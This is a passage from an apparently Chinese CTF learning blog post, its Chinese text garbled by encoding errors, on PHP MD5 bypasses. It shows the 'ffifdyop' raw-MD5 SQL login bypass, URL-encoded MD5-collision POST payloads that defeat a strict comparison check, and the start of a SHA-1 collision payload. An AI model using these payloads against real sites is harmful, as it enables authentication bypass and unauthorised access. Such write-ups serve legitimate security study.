class="hljs-keyword">from</span> â€™adminâ€™ <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span>md5($pass,<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>MD5æŠ¥æ–‡å°†ä»¥åŸå§‹ 16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼è¿”å›</p><p><strong>ffifdyop å­—ç¬¦ä¸²ç»è¿‡MD5åŠ å¯†åä¸º276f722736c95d99e921722cf9ed621c</strong><br><strong>åœ¨è½¬æ¢æˆå­—ç¬¦ä¸²ä¸ºâ€™orâ€™6ä¹±ç </strong></p><p>Select * from â€™adminâ€™ where password&#x3D;â€˜orâ€™6ä¹±ç <br><strong>ç›¸å½“äºä¸‡èƒ½å¯†ç </strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131783.png" alt="QQæˆªå›¾20220227223725"></p><h2 id="md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰"><a href="#md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰" class="headerlink" title="md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰"></a>md5å¼ºæ¯”è¾ƒï¼ˆé™åˆ¶å­—ç¬¦ä¸²ï¼‰</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>éœ€è¦ä½¿ç”¨ä½¿ç”¨md5åŠ å¯†åä¸¤ä¸ªå®Œå…¨ç›¸ç­‰çš„ä¸¤ä¸ªå­—ç¬¦ä¸²æ¥ç»•è¿‡è¿‡æ»¤ã€‚</strong><br>è¿™é‡Œå°±ä¸è¯¦ç»†è¯´äº†ã€‚ï¼ˆæˆ‘æ²¡æ€ä¹ˆçœ‹ï¼Œæˆ‘æ„Ÿè§‰åªè¦çŸ¥é“å°±è¡Œäº†ï¼‰</p><p>è¿™é‡Œæˆ‘æ˜¯çœŸæ²¡å¤ç°å‡ºæ¥ã€‚æˆ‘æ˜¯çœŸçš„ä¼šè°¢ï¼ï¼ï¼å¤ç°äº†ä¸€æ™šä¸ŠåŠ ä¸€ä¸‹åˆ+ç°åœ¨æ˜¯20.52åˆ†ã€‚æˆ‘çœŸçš„ä¼šè°¢ã€‚<br>ç»ˆäºå¤ç°å‡ºæ¥äº†ã€‚çœŸçš„ä¼šè°¢ã€‚<br><a href="https://segmentfault.com/a/1190000039189857">https://segmentfault.com/a/1190000039189857</a><br>è¿™æ˜¯ç”Ÿæˆå·¥å…·ã€‚æŒ‰ç…§ç”Ÿæˆä»£ç å°±è¡Œã€‚<br>æˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯æˆ‘çš„ä»£ç ç”Ÿæˆçš„æœ‰é—®é¢˜ã€‚è¯¢é—®<code>h3å¸ˆå‚…</code>æˆ‘æ˜¯çœŸæ²¡æƒ³åˆ°ä»–ä¸€ä¸‹å°±å¼„å‡ºæ¥äº†ã€‚ç„¶åä»–å°†payloadç»™äº†æˆ‘ï¼Œæˆ‘å¤ç°ä½†æ˜¯è¿˜æ˜¯ä¸è¡Œã€‚æˆ‘æ¢äº†å¾ˆå¤šphpç‰ˆæœ¬ï¼Œæœ€åè¿˜æ˜¯ä¸è¡Œã€‚</p><p>ç„¶åæœ€åç»è¿‡<code>å¤©ä¸Šæ˜Ÿ</code>å¸ˆå‚…çš„æé†’ï¼Œä¹Ÿè®¸æ˜¯æŠ“åŒ…çš„é—®é¢˜ï¼ˆæœ‰æ—¶å€™æŠ“åŒ…çš„æ—¶å€™ä¸èƒ½ç›´æ¥æ”¹æˆPOSTï¼‰ã€‚å¯æƒœæˆ‘æ²¡æœ‰åœ¨ç«ç‹é‡Œè£…<code>hackbar</code>ï¼Œç„¶åå°±åˆå»è£…ã€‚</p><p>æ¥ç€æˆ‘åˆå»è¯¢é—®<code>h3å¸ˆå‚…</code>åŸå› ï¼Œä»–è¯´ä»–å¯ä»¥ã€‚å¯èƒ½ä½¿æˆ‘çš„bpæœ‰é—®é¢˜ã€‚æˆ‘å®åœ¨ä¸æƒ³å»è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚æ¥ä¸‹æ¥ç›´æ¥å†™å¤ç°ä»£ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282059387.png" alt="QQæˆªå›¾20220228205918"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">a=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span><span class="hljs-number">29</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>F<span class="hljs-meta">%</span>C<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>wh<span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">66</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-number">4</span>C<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span>EEs<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span>&amp;b=<span class="hljs-number">1</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>u<span class="hljs-meta">%</span><span class="hljs-number">60</span><span class="hljs-meta">%</span>ACZ<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>A<span class="hljs-meta">%</span>C<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-meta">%</span><span class="hljs-number">7</span>E<span class="hljs-meta">%</span><span class="hljs-number">94</span><span class="hljs-meta">%</span>AA<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span>B<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span>DA<span class="hljs-meta">%</span><span class="hljs-number">1</span>A<span class="hljs-meta">%</span>A<span class="hljs-number">9</span>Aq<span class="hljs-meta">%</span><span class="hljs-number">0</span>DoP<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">7</span>F<span class="hljs-meta">%</span><span class="hljs-number">15</span>uB<span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>C<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>B<span class="hljs-meta">%</span>F<span class="hljs-number">7</span><span class="hljs-meta">%</span>E<span class="hljs-number">1</span><span class="hljs-meta">%</span>EAe<span class="hljs-meta">%</span><span class="hljs-number">0</span>D<span class="hljs-meta">%</span><span class="hljs-number">87</span><span class="hljs-meta">%</span>EB<span class="hljs-meta">%</span>E<span class="hljs-number">7</span><span class="hljs-meta">%</span>D<span class="hljs-number">6</span><span class="hljs-meta">%</span><span class="hljs-number">11</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>FF<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BI<span class="hljs-meta">%</span>D<span class="hljs-number">7</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>B<span class="hljs-meta">%</span>A<span class="hljs-number">9</span><span class="hljs-meta">%</span><span class="hljs-number">88</span><span class="hljs-meta">%</span>BE-<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>J<span class="hljs-meta">%</span><span class="hljs-number">24</span>w<span class="hljs-meta">%</span>E<span class="hljs-number">8</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>Bh<span class="hljs-number">6</span>C<span class="hljs-meta">%</span>EA<span class="hljs-meta">%</span>AFb<span class="hljs-meta">%</span>C<span class="hljs-number">5</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span>AF<span class="hljs-meta">%</span><span class="hljs-number">3</span>Ar<span class="hljs-meta">%</span>F<span class="hljs-number">0</span>z<span class="hljs-meta">%</span><span class="hljs-number">26</span><span class="hljs-meta">%</span><span class="hljs-number">98</span><span class="hljs-meta">%</span><span class="hljs-number">22</span><span class="hljs-meta">%</span>F<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">07</span><span class="hljs-meta">%</span><span class="hljs-number">83</span><span class="hljs-meta">%</span><span class="hljs-number">12</span><span class="hljs-meta">%</span>F<span class="hljs-number">6</span><span class="hljs-meta">%</span>B<span class="hljs-number">6</span>y<span class="hljs-meta">%</span>E<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">0</span>C<span class="hljs-number">5</span>p<span class="hljs-meta">%</span>F<span class="hljs-number">7</span>PH<span class="hljs-meta">%</span><span class="hljs-number">5</span>D<span class="hljs-meta">%</span>DDq<span class="hljs-meta">%</span><span class="hljs-number">9</span>F<span class="hljs-meta">%</span>FE<span class="hljs-meta">%</span><span class="hljs-number">2</span>Fw<span class="hljs-meta">%</span>B<span class="hljs-number">3</span><span class="hljs-meta">%</span><span class="hljs-number">82</span><span class="hljs-meta">%</span><span class="hljs-number">27</span><span class="hljs-meta">%</span>D<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>CD<span class="hljs-meta">%</span><span class="hljs-number">99</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>F<span class="hljs-meta">%</span>B<span class="hljs-number">4</span>B<span class="hljs-meta">%</span><span class="hljs-number">9</span>D<span class="hljs-meta">%</span>C<span class="hljs-number">7</span>P<span class="hljs-meta">%</span>B<span class="hljs-number">0</span><span class="hljs-meta">%</span>C<span class="hljs-number">3</span>P<span class="hljs-meta">%</span>D<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">93</span><span class="hljs-meta">%</span>FFr<span class="hljs-meta">%</span>B<span class="hljs-number">2</span><span class="hljs-meta">%</span><span class="hljs-number">8</span>A<span class="hljs-symbol">ns3</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>A<span class="hljs-meta">%</span><span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>è¿™é‡ŒåŒæ ·é™„ä¸Š(<code>h3å¸ˆå‚…</code>çš„)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;array<span class="hljs-number">2</span><span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><h3 id="sha-1"><a href="#sha-1" class="headerlink" title="sha-1"></a>sha-1</h3><p>å¦‚æœå°†è¿™é‡Œçš„MD5æ¢æˆsha1ï¼Œå°±å¯ä»¥ç”¨ä¸‹é¢ä»£ç ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">array<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span 